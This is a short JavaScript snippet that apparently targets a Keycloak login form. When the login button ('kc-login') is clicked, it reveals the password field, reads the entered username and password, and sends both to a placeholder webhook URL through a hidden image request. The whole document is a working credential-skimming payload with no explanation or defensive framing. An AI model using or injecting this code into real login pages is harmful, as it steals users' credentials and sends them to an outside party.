var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        
        new Image().src = '<webhook_URL>/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    };
}
